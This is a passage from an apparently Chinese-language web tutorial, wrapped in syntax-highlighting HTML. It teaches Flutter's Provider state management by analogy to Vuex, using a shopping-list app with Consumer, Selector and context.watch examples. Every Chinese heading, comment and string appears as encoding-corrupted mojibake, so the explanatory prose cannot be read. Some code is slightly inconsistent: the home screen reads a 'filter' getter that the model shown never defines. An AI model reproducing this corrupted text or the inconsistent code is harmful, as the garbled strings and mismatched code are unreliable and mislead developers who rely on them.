      isCompleted: isCompleted ?? <span class="hljs-keyword">this</span>.isCompleted,
      category: category ?? <span class="hljs-keyword">this</span>.category,
    );
  }
}

<span class="hljs-comment">// lib/models/shopping_list_model.dart</span>
<span class="hljs-keyword">import</span> <span class="hljs-string">'package:flutter/material.dart'</span>;
<span class="hljs-keyword">import</span> <span class="hljs-string">'shopping_item.dart'</span>;

<span class="hljs-comment">// ç±»æ¯” Vuex Module</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ShoppingListModel</span> <span class="hljs-title">with</span> <span class="hljs-title">ChangeNotifier</span> </span>{
  <span class="hljs-comment">// çŠ¶æ€ï¼ˆStateï¼‰</span>
  <span class="hljs-built_in">List</span>&lt;ShoppingItem&gt; _items = [];
  <span class="hljs-built_in">double</span> _budget = <span class="hljs-number">500.0</span>;
  <span class="hljs-built_in">String</span> _filter = <span class="hljs-string">'all'</span>; <span class="hljs-comment">// 'all', 'active', 'completed'</span>
  
  <span class="hljs-comment">// Getterï¼ˆè®¡ç®—å±æ€§ï¼‰</span>
  <span class="hljs-built_in">List</span>&lt;ShoppingItem&gt; <span class="hljs-keyword">get</span> items {
    <span class="hljs-keyword">switch</span> (_filter) {
      <span class="hljs-keyword">case</span> <span class="hljs-string">'active'</span>:
        <span class="hljs-keyword">return</span> _items.where((item) =&gt; !item.isCompleted).toList();
      <span class="hljs-keyword">case</span> <span class="hljs-string">'completed'</span>:
        <span class="hljs-keyword">return</span> _items.where((item) =&gt; item.isCompleted).toList();
      <span class="hljs-keyword">default</span>:
        <span class="hljs-keyword">return</span> _items;
    }
  }
  
  <span class="hljs-built_in">double</span> <span class="hljs-keyword">get</span> totalSpent {
    <span class="hljs-keyword">return</span> _items
        .where((item) =&gt; item.isCompleted)
        .fold(<span class="hljs-number">0</span>, (sum, item) =&gt; sum + item.totalPrice);
  }
  
  <span class="hljs-built_in">double</span> <span class="hljs-keyword">get</span> remainingBudget =&gt; _budget - totalSpent;
  
  <span class="hljs-built_in">int</span> <span class="hljs-keyword">get</span> activeCount =&gt; _items.where((item) =&gt; !item.isCompleted).length;
  
  <span class="hljs-comment">// Mutations/Actions</span>
  <span class="hljs-keyword">void</span> addItem(<span class="hljs-built_in">String</span> name, <span class="hljs-built_in">double</span> price, <span class="hljs-built_in">String</span> category) {
    <span class="hljs-keyword">final</span> newItem = ShoppingItem(
      name: name,
      price: price,
      category: category,
    );
    _items.add(newItem);
    _sortItems(); <span class="hljs-comment">// å†…éƒ¨æ–¹æ³•ï¼Œä¸å¯¹å¤–æš´éœ²</span>
    notifyListeners(); <span class="hljs-comment">// ç›¸å½“äº Vuex çš„ state å˜åŒ–è§¦å‘è§†å›¾æ›´æ–°</span>
  }
  
  <span class="hljs-keyword">void</span> toggleItem(<span class="hljs-built_in">String</span> id) {
    <span class="hljs-keyword">final</span> index = _items.indexWhere((item) =&gt; item.id == id);
    <span class="hljs-keyword">if</span> (index != <span class="hljs-number">-1</span>) {
      <span class="hljs-comment">// ä¸å¯å˜æ€§ï¼šåˆ›å»ºæ–°å¯¹è±¡æ›¿æ¢æ—§å¯¹è±¡</span>
      <span class="hljs-keyword">final</span> oldItem = _items[index];
      <span class="hljs-keyword">final</span> newItem = oldItem.copyWith(
        isCompleted: !oldItem.isCompleted,
      );
      _items[index] = newItem;
      notifyListeners();
    }
  }
  
  <span class="hljs-keyword">void</span> updateQuantity(<span class="hljs-built_in">String</span> id, <span class="hljs-built_in">int</span> newQuantity) {
    <span class="hljs-keyword">final</span> index = _items.indexWhere((item) =&gt; item.id == id);
    <span class="hljs-keyword">if</span> (index != <span class="hljs-number">-1</span> &amp;&amp; newQuantity &gt; <span class="hljs-number">0</span>) {
      <span class="hljs-keyword">final</span> oldItem = _items[index];
      <span class="hljs-keyword">final</span> newItem = oldItem.copyWith(quantity: newQuantity);
      _items[index] = newItem;
      notifyListeners();
    }
  }
  
  <span class="hljs-keyword">void</span> removeItem(<span class="hljs-built_in">String</span> id) {
    _items.removeWhere((item) =&gt; item.id == id);
    notifyListeners();
  }
  
  <span class="hljs-keyword">void</span> setFilter(<span class="hljs-built_in">String</span> filter) {
    _filter = filter;
    notifyListeners(); <span class="hljs-comment">// è¿‡æ»¤æ¡ä»¶å˜åŒ–ä¹Ÿéœ€è¦é€šçŸ¥</span>
  }
  
  <span class="hljs-keyword">void</span> updateBudget(<span class="hljs-built_in">double</span> newBudget) {
    _budget = newBudget;
    notifyListeners();
  }
  
  <span class="hljs-comment">// ç§æœ‰æ–¹æ³•ï¼Œä¸éœ€è¦é€šçŸ¥å¤–éƒ¨</span>
  <span class="hljs-keyword">void</span> _sortItems() {
    _items.sort((a, b) =&gt; a.createdAt.compareTo(b.createdAt));
  }
  
  <span class="hljs-comment">// å¼‚æ­¥ Action ç¤ºä¾‹ï¼ˆå¦‚ä» API åŠ è½½ï¼‰</span>
  Future&lt;<span class="hljs-keyword">void</span>&gt; loadInitialItems() <span class="hljs-keyword">async</span> {
    <span class="hljs-comment">// æ¨¡æ‹Ÿ API è¯·æ±‚</span>
    <span class="hljs-keyword">await</span> Future.delayed(<span class="hljs-built_in">Duration</span>(seconds: <span class="hljs-number">1</span>));
    
    _items = [
      ShoppingItem(name: <span class="hljs-string">'ç‰›å¥¶'</span>, price: <span class="hljs-number">12.5</span>, category: <span class="hljs-string">'é£Ÿå“'</span>),
      ShoppingItem(name: <span class="hljs-string">'é¸¡è›‹'</span>, price: <span class="hljs-number">25.0</span>, category: <span class="hljs-string">'é£Ÿå“'</span>, quantity: <span class="hljs-number">2</span>),
      ShoppingItem(name: <span class="hljs-string">'çº¸å·¾'</span>, price: <span class="hljs-number">15.0</span>, category: <span class="hljs-string">'æ—¥ç”¨å“'</span>, isCompleted: <span class="hljs-keyword">true</span>),
    ];
    notifyListeners();
  }
}
</code></pre>
<h3 data-id="heading-9">3.2 ç¬¬äºŒæ­¥ï¼šProvider æ³¨å…¥ï¼ˆç±»æ¯” Vue.use(Vuex)ï¼‰</h3>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-comment">// lib/main.dart</span>
<span class="hljs-keyword">import</span> <span class="hljs-string">'package:flutter/material.dart'</span>;
<span class="hljs-keyword">import</span> <span class="hljs-string">'package:provider/provider.dart'</span>;
<span class="hljs-keyword">import</span> <span class="hljs-string">'models/shopping_list_model.dart'</span>;
<span class="hljs-keyword">import</span> <span class="hljs-string">'screens/home_screen.dart'</span>;

<span class="hljs-keyword">void</span> main() {
  runApp(
    <span class="hljs-comment">// MultiProvider ç±»æ¯” Vuex çš„ modules</span>
    MultiProvider(
      providers: [
        <span class="hljs-comment">// æ¯ä¸ª Provider éƒ½æ˜¯ä¸€ä¸ªç‹¬ç«‹çš„"ä½œç”¨åŸŸ"</span>
        ChangeNotifierProvider(
          create: (context) =&gt; ShoppingListModel(),
          <span class="hljs-comment">// å¯é€‰ï¼šåˆå§‹åŒ–æ—¶åŠ è½½æ•°æ®</span>
          lazy: <span class="hljs-keyword">false</span>, <span class="hljs-comment">// ç«‹å³åˆ›å»ºï¼Œä¸å»¶è¿Ÿ</span>
        ),
        <span class="hljs-comment">// å¯ä»¥æ·»åŠ æ›´å¤š Providerï¼ˆå¦‚ç”¨æˆ·é…ç½®ã€ä¸»é¢˜ç­‰ï¼‰</span>
      ],
      child: MyApp(),
    ),
  );
}

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">MyApp</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">StatelessWidget</span> </span>{
  <span class="hljs-meta">@override</span>
  Widget build(BuildContext context) {
    <span class="hljs-comment">// å¯ä»¥åœ¨è¿™é‡Œè®¿é—® Providerï¼Œä½†é€šå¸¸ä¸åœ¨è¿™é‡Œæ¶ˆè´¹æ•°æ®</span>
    <span class="hljs-keyword">return</span> MaterialApp(
      title: <span class="hljs-string">'æ™ºèƒ½è´­ç‰©æ¸…å•'</span>,
      theme: ThemeData(
        primarySwatch: Colors.blue,
        visualDensity: VisualDensity.adaptivePlatformDensity,
      ),
      home: HomeScreen(),
      debugShowCheckedModeBanner: <span class="hljs-keyword">false</span>,
    );
  }
}
</code></pre>
<h3 data-id="heading-10">3.3 ç¬¬ä¸‰æ­¥ï¼šUI ç»„ä»¶æ¶ˆè´¹çŠ¶æ€</h3>
<h4 data-id="heading-11">3.3.1 æ–¹å¼ä¸€ï¼šConsumerï¼ˆæœ€å¸¸ç”¨ï¼‰</h4>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-comment">// lib/widgets/shopping_list.dart</span>
<span class="hljs-keyword">import</span> <span class="hljs-string">'package:flutter/material.dart'</span>;
<span class="hljs-keyword">import</span> <span class="hljs-string">'package:provider/provider.dart'</span>;
<span class="hljs-keyword">import</span> <span class="hljs-string">'../models/shopping_list_model.dart'</span>;

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ShoppingList</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">StatelessWidget</span> </span>{
  <span class="hljs-meta">@override</span>
  Widget build(BuildContext context) {
    <span class="hljs-comment">// Consumer ç±»ä¼¼äº Vue çš„ mapState</span>
    <span class="hljs-keyword">return</span> Consumer&lt;ShoppingListModel&gt;(
      builder: (context, model, child) {
        <span class="hljs-comment">// model æ˜¯å½“å‰ ShoppingListModel çš„å®ä¾‹</span>
        <span class="hljs-keyword">if</span> (model.items.isEmpty) {
          <span class="hljs-keyword">return</span> Center(
            child: Column(
              mainAxisAlignment: MainAxisAlignment.center,
              children: [
                Icon(Icons.shopping_cart_outlined, size: <span class="hljs-number">64</span>, color: Colors.grey[<span class="hljs-number">300</span>]),
                SizedBox(height: <span class="hljs-number">16</span>),
                Text(
                  <span class="hljs-string">'è´­ç‰©æ¸…å•ä¸ºç©º'</span>,
                  style: TextStyle(color: Colors.grey, fontSize: <span class="hljs-number">18</span>),
                ),
                TextButton(
                  onPressed: () =&gt; model.loadInitialItems(),
                  child: Text(<span class="hljs-string">'åŠ è½½ç¤ºä¾‹æ•°æ®'</span>),
                ),
              ],
            ),
          );
        }
        
        <span class="hljs-keyword">return</span> ListView.builder(
          itemCount: model.items.length,
          itemBuilder: (context, index) {
            <span class="hljs-keyword">final</span> item = model.items[index];
            <span class="hljs-keyword">return</span> _ShoppingItemCard(item: item);
          },
        );
      },
    );
  }
}

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">_ShoppingItemCard</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">StatelessWidget</span> </span>{
  <span class="hljs-keyword">final</span> ShoppingItem item;
  
  <span class="hljs-keyword">const</span> _ShoppingItemCard({<span class="hljs-keyword">required</span> <span class="hljs-keyword">this</span>.item});
  
  <span class="hljs-meta">@override</span>
  Widget build(BuildContext context) {
    <span class="hljs-comment">// åœ¨å†…éƒ¨ä½¿ç”¨ Provider.ofï¼Œç±»ä¼¼ Vue çš„ this.$store</span>
    <span class="hljs-keyword">final</span> model = Provider.of&lt;ShoppingListModel&gt;(context, listen: <span class="hljs-keyword">false</span>);
    
    <span class="hljs-keyword">return</span> Card(
      margin: EdgeInsets.symmetric(horizontal: <span class="hljs-number">16</span>, vertical: <span class="hljs-number">8</span>),
      elevation: <span class="hljs-number">2</span>,
      shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(<span class="hljs-number">12</span>)),
      child: ListTile(
        leading: Checkbox(
          value: item.isCompleted,
          onChanged: (_) =&gt; model.toggleItem(item.id),
          shape: CircleBorder(),
        ),
        title: Text(
          item.name,
          style: TextStyle(
            fontSize: <span class="hljs-number">16</span>,
            decoration: item.isCompleted ? TextDecoration.lineThrough : <span class="hljs-keyword">null</span>,
            color: item.isCompleted ? Colors.grey : Colors.black87,
          ),
        ),
        subtitle: Text(
          <span class="hljs-string">'<span class="hljs-subst">${item.quantity}</span> Ã— Â¥<span class="hljs-subst">${item.price.toStringAsFixed(<span class="hljs-number">2</span>)}</span> = Â¥<span class="hljs-subst">${item.totalPrice.toStringAsFixed(<span class="hljs-number">2</span>)}</span>'</span>,
          style: TextStyle(
            color: item.isCompleted ? Colors.grey : Colors.blueGrey,
          ),
        ),
        trailing: Row(
          mainAxisSize: MainAxisSize.min,
          children: [
            <span class="hljs-comment">// æ•°é‡è°ƒæ•´</span>
            Container(
              decoration: BoxDecoration(
                color: Colors.blue[<span class="hljs-number">50</span>],
                borderRadius: BorderRadius.circular(<span class="hljs-number">20</span>),
              ),
              child: Row(
                children: [
                  IconButton(
                    icon: Icon(Icons.remove, size: <span class="hljs-number">18</span>),
                    onPressed: () =&gt; model.updateQuantity(item.id, item.quantity - <span class="hljs-number">1</span>),
                  ),
                  Text(<span class="hljs-string">'<span class="hljs-subst">${item.quantity}</span>'</span>),
                  IconButton(
                    icon: Icon(Icons.add, size: <span class="hljs-number">18</span>),
                    onPressed: () =&gt; model.updateQuantity(item.id, item.quantity + <span class="hljs-number">1</span>),
                  ),
                ],
              ),
            ),
            SizedBox(width: <span class="hljs-number">8</span>),
            <span class="hljs-comment">// åˆ é™¤æŒ‰é’®</span>
            IconButton(
              icon: Icon(Icons.delete_outline, color: Colors.red[<span class="hljs-number">300</span>]),
              onPressed: () =&gt; model.removeItem(item.id),
            ),
          ],
        ),
      ),
    );
  }
}
</code></pre>
<h4 data-id="heading-12">3.3.2 æ–¹å¼äºŒï¼šSelectorï¼ˆæ€§èƒ½ä¼˜åŒ–ï¼‰</h4>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-comment">// lib/widgets/stats_card.dart</span>
<span class="hljs-keyword">import</span> <span class="hljs-string">'package:flutter/material.dart'</span>;
<span class="hljs-keyword">import</span> <span class="hljs-string">'package:provider/provider.dart'</span>;
<span class="hljs-keyword">import</span> <span class="hljs-string">'../models/shopping_list_model.dart'</span>;

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">StatsCard</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">StatelessWidget</span> </span>{
  <span class="hljs-meta">@override</span>
  Widget build(BuildContext context) {
    <span class="hljs-comment">// Selector ç±»ä¼¼äº Vue çš„è®¡ç®—å±æ€§ + æ¡ä»¶æ¸²æŸ“</span>
    <span class="hljs-comment">// åªç›‘å¬ç‰¹å®šæ•°æ®çš„å˜åŒ–ï¼Œé¿å…ä¸å¿…è¦çš„é‡å»º</span>
    <span class="hljs-keyword">return</span> Selector&lt;ShoppingListModel, <span class="hljs-built_in">double</span>&gt;(
      selector: (context, model) =&gt; model.totalSpent,
      builder: (context, totalSpent, child) {
        <span class="hljs-comment">// child æ˜¯ä¸ä¼šé‡å»ºçš„éƒ¨åˆ†ï¼ˆæ€§èƒ½ä¼˜åŒ–ï¼‰</span>
        <span class="hljs-keyword">return</span> Selector&lt;ShoppingListModel, <span class="hljs-built_in">double</span>&gt;(
          selector: (context, model) =&gt; model.remainingBudget,
          builder: (context, remainingBudget, child) {
            <span class="hljs-keyword">return</span> Selector&lt;ShoppingListModel, <span class="hljs-built_in">int</span>&gt;(
              selector: (context, model) =&gt; model.activeCount,
              builder: (context, activeCount, child) {
                <span class="hljs-keyword">return</span> Card(
                  margin: EdgeInsets.all(<span class="hljs-number">16</span>),
                  color: Colors.blue[<span class="hljs-number">50</span>],
                  child: Padding(
                    padding: EdgeInsets.all(<span class="hljs-number">16</span>),
                    child: Column(
                      children: [
                        <span class="hljs-comment">// æ€»èŠ±è´¹</span>
                        _StatRow(
                          icon: Icons.shopping_cart,
                          label: <span class="hljs-string">'å·²èŠ±è´¹'</span>,
                          value: <span class="hljs-string">'Â¥<span class="hljs-subst">${totalSpent.toStringAsFixed(<span class="hljs-number">2</span>)}</span>'</span>,
                          color: Colors.blue,
                        ),
                        Divider(height: <span class="hljs-number">20</span>),
                        <span class="hljs-comment">// å‰©ä½™é¢„ç®—</span>
                        _StatRow(
                          icon: Icons.account_balance_wallet,
                          label: <span class="hljs-string">'å‰©ä½™é¢„ç®—'</span>,
                          value: <span class="hljs-string">'Â¥<span class="hljs-subst">${remainingBudget.toStringAsFixed(<span class="hljs-number">2</span>)}</span>'</span>,
                          color: remainingBudget &gt; <span class="hljs-number">0</span> ? Colors.green : Colors.red,
                        ),
                        Divider(height: <span class="hljs-number">20</span>),
                        <span class="hljs-comment">// å¾…è´­æ•°é‡</span>
                        _StatRow(
                          icon: Icons.checklist,
                          label: <span class="hljs-string">'å¾…è´­é¡¹ç›®'</span>,
                          value: <span class="hljs-string">'<span class="hljs-subst">$activeCount</span> é¡¹'</span>,
                          color: Colors.orange,
                        ),
                        <span class="hljs-comment">// é¢„ç®—è¿›åº¦æ¡</span>
                        SizedBox(height: <span class="hljs-number">16</span>),
                        LinearProgressIndicator(
                          value: totalSpent / <span class="hljs-number">500</span>, <span class="hljs-comment">// 500æ˜¯é¢„ç®—ä¸Šé™</span>
                          backgroundColor: Colors.grey[<span class="hljs-number">200</span>],
                          valueColor: AlwaysStoppedAnimation&lt;Color&gt;(
                            remainingBudget &gt; <span class="hljs-number">0</span> ? Colors.green : Colors.red,
                          ),
                        ),
                      ],
                    ),
                  ),
                );
              },
            );
          },
        );
      },
    );
  }
}

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">_StatRow</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">StatelessWidget</span> </span>{
  <span class="hljs-keyword">final</span> IconData icon;
  <span class="hljs-keyword">final</span> <span class="hljs-built_in">String</span> label;
  <span class="hljs-keyword">final</span> <span class="hljs-built_in">String</span> value;
  <span class="hljs-keyword">final</span> Color color;
  
  <span class="hljs-keyword">const</span> _StatRow({
    <span class="hljs-keyword">required</span> <span class="hljs-keyword">this</span>.icon,
    <span class="hljs-keyword">required</span> <span class="hljs-keyword">this</span>.label,
    <span class="hljs-keyword">required</span> <span class="hljs-keyword">this</span>.value,
    <span class="hljs-keyword">required</span> <span class="hljs-keyword">this</span>.color,
  });
  
  <span class="hljs-meta">@override</span>
  Widget build(BuildContext context) {
    <span class="hljs-keyword">return</span> Row(
      children: [
        Icon(icon, color: color),
        SizedBox(width: <span class="hljs-number">12</span>),
        Expanded(
          child: Text(label, style: TextStyle(fontSize: <span class="hljs-number">14</span>, color: Colors.grey[<span class="hljs-number">700</span>])),
        ),
        Text(
          value,
          style: TextStyle(
            fontSize: <span class="hljs-number">16</span>,
            fontWeight: FontWeight.bold,
            color: color,
          ),
        ),
      ],
    );
  }
}
</code></pre>
<h4 data-id="heading-13">3.3.3 æ–¹å¼ä¸‰ï¼šcontext.watch / context.readï¼ˆDart æ‰©å±•æ–¹æ³•ï¼‰</h4>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-comment">// lib/screens/home_screen.dart</span>
<span class="hljs-keyword">import</span> <span class="hljs-string">'package:flutter/material.dart'</span>;
<span class="hljs-keyword">import</span> <span class="hljs-string">'package:provider/provider.dart'</span>;
<span class="hljs-keyword">import</span> <span class="hljs-string">'../models/shopping_list_model.dart'</span>;
<span class="hljs-keyword">import</span> <span class="hljs-string">'../widgets/shopping_list.dart'</span>;
<span class="hljs-keyword">import</span> <span class="hljs-string">'../widgets/stats_card.dart'</span>;
<span class="hljs-keyword">import</span> <span class="hljs-string">'../widgets/add_item_dialog.dart'</span>;

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">HomeScreen</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">StatelessWidget</span> </span>{
  <span class="hljs-meta">@override</span>
  Widget build(BuildContext context) {
    <span class="hljs-comment">// context.watch ç±»ä¼¼äº Vue 3 çš„ useStore() + computed</span>
    <span class="hljs-comment">// å®ƒä¼šç›‘å¬å˜åŒ–ï¼Œæ•°æ®æ›´æ–°æ—¶é‡å»º Widget</span>
    <span class="hljs-keyword">final</span> filter = context.watch&lt;ShoppingListModel&gt;().filter;
    
    <span class="hljs-keyword">return</span> Scaffold(
      appBar: AppBar(
        title: Text(<span class="hljs-string">'æ™ºèƒ½è´­ç‰©æ¸…å•'</span>),
        actions: [
          <span class="hljs-comment">// è¿‡æ»¤æŒ‰é’®</span>
          PopupMenuButton&lt;<span class="hljs-built_in">String</span>&gt;(
            onSelected: (value) {
              <span class="hljs-comment">// context.read ç±»ä¼¼äº listen: false çš„ Provider.of</span>
              <span class="hljs-comment">// åªè¯»å–æ•°æ®ï¼Œä¸ç›‘å¬å˜åŒ–</span>
              context.read&lt;ShoppingListModel&gt;().setFilter(value);
            },
            itemBuilder: (context) =&gt; [
              PopupMenuItem(value: <span class="hljs-string">'all'</span>, child: Text(<span class="hljs-string">'å…¨éƒ¨'</span>)),
              PopupMenuItem(value: <span class="hljs-string">'active'</span>, child: Text(<span class="hljs-string">'å¾…è´­'</span>)),
              PopupMenuItem(value: <span class="hljs-string">'completed'</span>, child: Text(<span class="hljs-string">'å·²è´­'</span>)),
            ],
            child: Row(
              children: [
                Icon(Icons.filter_list),
                SizedBox(width: <span class="hljs-number">4</span>),
                Text(_getFilterText(filter)),
              ],
            ),
          ),
          SizedBox(width: <span class="hljs-number">16</span>),
        ],
      ),
      body: Column(
        children: [
          <span class="hljs-comment">// ç»Ÿè®¡å¡ç‰‡</span>
          StatsCard(),
          SizedBox(height: <span class="hljs-number">8</span>),
          <span class="hljs-comment">// è´­ç‰©æ¸…å•</span>
          Expanded(child: ShoppingList()),
        ],
      ),
      floatingActionButton: FloatingActionButton(
        onPressed: () =&gt; _showAddDialog(context),
        child: Icon(Icons.add),
        backgroundColor: Colors.blue,
      ),
    );
  }
  
  <span class="hljs-built_in">String</span> _getFilterText(<span class="hljs-built_in">String</span> filter) {
    <span class="hljs-keyword">switch</span> (filter) {
      <span class="hljs-keyword">case</span> <span class="hljs-string">'active'</span>: <span class="hljs-keyword">return</span> <span class="hljs-string">'å¾…è´­'</span>;
      <span class="hljs-keyword">case</span> <span class="hljs-string">'completed'</span>: <span class="hljs-keyword">return</span> <span class="hljs-string">'å·²è´­'</span>;
      <span class="hljs-keyword">default</span>: <span class="hljs-keyword">return</span> <span class="hljs-string">'å…¨éƒ¨'</span>;
    }
  }
  
  <span class="hljs-keyword">void</span> _showAddDialog(BuildContext context) {
    showDialog(
      context: context,
      builder: (context) =&gt; AddItemDialog(),
    );
  }
}
</code></pre>
<h2 data-id="heading-14">å››ã€Vue å¼€å‘è€…ç‰¹åˆ«æ³¨æ„çš„é™·é˜±</h2>
<h3 data-id="heading-15">4.1 é¿å…ä¸å¿…è¦çš„é‡å»º</h3>
<p><strong>é”™è¯¯ç¤ºä¾‹</strong>ï¼š</p>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-comment">// æ•´ä¸ªé¡µé¢éƒ½åœ¨ç›‘å¬å˜åŒ–</span>
<span class="hljs-meta">@override</span>
Widget build(BuildContext context) {
  <span class="hljs-keyword">final</span> model = Provider.of&lt;ShoppingListModel&gt;(context);
  <span class="hljs-keyword">return</span> Scaffold(
    appBar: AppBar(title: Text(<span class="hljs-string">'è´­ç‰©æ¸…å•'</span>)),
    body: ListView(
      children: [
        <span class="hljs-comment">// ä»»ä½•çŠ¶æ€å˜åŒ–éƒ½ä¼šé‡å»ºæ•´ä¸ªé¡µé¢ï¼</span>
        _buildStats(model),
        _buildList(model),
        _buildFooter(model),
      ],
    ),
  );
}
</code></pre>
<p><strong>æ­£ç¡®åšæ³•</strong>ï¼š</p>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-comment">// ç²¾ç»†åŒ–ç›‘å¬</span>
<span class="hljs-meta">@override</span>
Widget build(BuildContext context) {
  <span class="hljs-keyword">return</span> Scaffold(
    appBar: AppBar(title: Text(<span class="hljs-string">'è´­ç‰©æ¸…å•'</span>)),
    body: Column(
      children: [
        <span class="hljs-comment">// åªæœ‰ç»Ÿè®¡éƒ¨åˆ†ç›‘å¬ç»Ÿè®¡æ•°æ®å˜åŒ–</span>
        StatsCard(),
        <span class="hljs-comment">// åªæœ‰åˆ—è¡¨éƒ¨åˆ†ç›‘å¬åˆ—è¡¨æ•°æ®å˜åŒ–</span>
        Expanded(child: ShoppingList()),
        <span class="hljs-comment">// é¡µè„šä¸éœ€è¦ç›‘å¬</span>
        _buildFooter(),
      ],
    ),
  );
}
</code></pre>
<h3 data-id="heading-16">4.2 å¤„ç†å¼‚æ­¥æ“ä½œ</h3>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ShoppingListModel</span> <span class="hljs-title">with</span> <span class="hljs-title">ChangeNotifier</span> </span>{
  <span class="hljs-built_in">bool</span> _isLoading = <span class="hljs-keyword">false</span>;
  <span class="hljs-built_in">String?</span> _error;
  
  <span class="hljs-built_in">bool</span> <span class="hljs-keyword">get</span> isLoading =&gt; _isLoading;
  <span class="hljs-built_in">String?</span> <span class="hljs-keyword">get</span> error =&gt; _error;
  
  Future&lt;<span class="hljs-keyword">void</span>&gt; fetchItems() <span class="hljs-keyword">async</span> {
    _isLoading = <span class="hljs-keyword">true</span>;
    _error = <span class="hljs-keyword">null</span>;
    notifyListeners(); <span class="hljs-comment">// é€šçŸ¥ UI æ˜¾ç¤ºåŠ è½½çŠ¶æ€</span>
    
    <span class="hljs-keyword">try</span> {
      <span class="hljs-comment">// æ¨¡æ‹Ÿ API è°ƒç”¨</span>
      <span class="hljs-keyword">await</span> Future.delayed(<span class="hljs-built_in">Duration</span>(seconds: <span class="hljs-number">2</span>));
      _items = <span class="hljs-keyword">await</span> _apiService.getItems();
      _error = <span class="hljs-keyword">null</span>;
    } <span class="hljs-keyword">catch</span> (e) {
      _error = <span class="hljs-string">'åŠ è½½å¤±è´¥: <span class="hljs-subst">$e</span>'</span>;
    } <span class="hljs-keyword">finally</span> {
      _isLoading = <span class="hljs-keyword">false</span>;
      notifyListeners(); <span class="hljs-comment">// é€šçŸ¥ UI æ›´æ–°çŠ¶æ€</span>
    }
  }
}

<span class="hljs-comment">// UI ä¸­ä½¿ç”¨</span>
Consumer&lt;ShoppingListModel&gt;(
  builder: (context, model, child) {
    <span class="hljs-keyword">if</span> (model.isLoading) {
      <span class="hljs-keyword">return</span> Center(child: CircularProgressIndicator());
    }
    
    <span class="hljs-keyword">if</span> (model.error != <span class="hljs-keyword">null</span>) {
      <span class="hljs-keyword">return</span> Center(child: Text(<span class="hljs-string">'é”™è¯¯: <span class="hljs-subst">${model.error}</span>'</span>));
    }
    
    <span class="hljs-keyword">return</span> ListView(...);
  },
)
</code></pre>
<h3 data-id="heading-17">4.3 åµŒå¥— Provider ä½œç”¨åŸŸ</h3>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-comment">// å¯ä»¥åµŒå¥—ä¸åŒä½œç”¨åŸŸçš„ Provider</span>
ChangeNotifierProvider(
  create: (_) =&gt; GlobalModel(),
  child: Builder(
    builder: (context) {
      <span class="hljs-comment">// è¿™é‡Œå¯ä»¥è®¿é—® GlobalModel</span>
      <span class="hljs-keyword">final</span> globalModel = context.read&lt;GlobalModel&gt;();
      
      <span class="hljs-keyword">return</span> ChangeNotifierProvider(
        create: (_) =&gt; LocalModel(globalModel.someValue),
        child: LocalScreen(),
      );
    },
  ),
)
</code></pre>
<h2 data-id="heading-18">äº”ã€é¡¹ç›®ç»“æ„å»ºè®®</h2>
<pre><code class="hljs language-bash" lang="bash">lib/
â”œâ”€â”€ main.dart                    <span class="hljs-comment"># åº”ç”¨å…¥å£ï¼ŒProvider åˆå§‹åŒ–</span>
â”œâ”€â”€ models/                      <span class="hljs-comment"># æ•°æ®æ¨¡å‹ï¼ˆç›¸å½“äº Vuex modulesï¼‰</span>
â”‚   â”œâ”€â”€ shopping_item.dart      <span class="hljs-comment"># æ•°æ®ç±»ï¼ˆç›¸å½“äº Vuex state ç»“æ„ï¼‰</span>
â”‚   â”œâ”€â”€ shopping_list_model.dart <span class="hljs-comment"># ChangeNotifier ç±»</span>
â”‚   â””â”€â”€ user_preferences.dart   <span class="hljs-comment"># å…¶ä»–æ¨¡å‹</span>
â”œâ”€â”€ providers/                   <span class="hljs-comment"># Provider é…ç½®ï¼ˆå¯é€‰ï¼‰</span>
â”‚   â””â”€â”€ multi_providers.dart    <span class="hljs-comment"># MultiProvider é…ç½®</span>
â”œâ”€â”€ screens/                     <span class="hljs-comment"># é¡µé¢çº§ç»„ä»¶</span>
â”‚   â”œâ”€â”€ home_screen.dart
â”‚   â””â”€â”€ settings_screen.dart
â”œâ”€â”€ widgets/                     <span class="hljs-comment"># å¯å¤ç”¨ UI ç»„ä»¶</span>
â”‚   â”œâ”€â”€ shopping_list.dart
â”‚   â”œâ”€â”€ stats_card.dart
â”‚   â””â”€â”€ add_item_dialog.dart
â”œâ”€â”€ services/                    <span class="hljs-comment"># ä¸šåŠ¡é€»è¾‘ï¼ˆAPI è°ƒç”¨ç­‰ï¼‰</span>
â”‚   â””â”€â”€ api_service.dart
â””â”€â”€ utils/                       <span class="hljs-comment"># å·¥å…·å‡½æ•°</span>
    â””â”€â”€ formatters.dart
</code></pre>
<h2 data-id="heading-19">å…­ã€è°ƒè¯•æŠ€å·§</h2>
<h3 data-id="heading-20">6.1 Provider è°ƒè¯•å·¥å…·</h3>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-comment">// åœ¨ MaterialApp å¤–å±‚åŒ…è£¹</span>
<span class="hljs-keyword">void</span> main() {
  runApp(
    MultiProvider(
      providers: [...],
      child: Builder(
        builder: (context) {
          <span class="hljs-comment">// æ·»åŠ è°ƒè¯•å±‚</span>
          <span class="hljs-keyword">return</span> ProviderDebugger(
            child: MyApp(),
            showProviderData: <span class="hljs-keyword">true</span>, <span class="hljs-comment">// æ˜¾ç¤ºå½“å‰å¯ç”¨çš„ Provider</span>
            showRebuildCount: <span class="hljs-keyword">true</span>, <span class="hljs-comment">// æ˜¾ç¤º Widget é‡å»ºæ¬¡æ•°</span>
          );
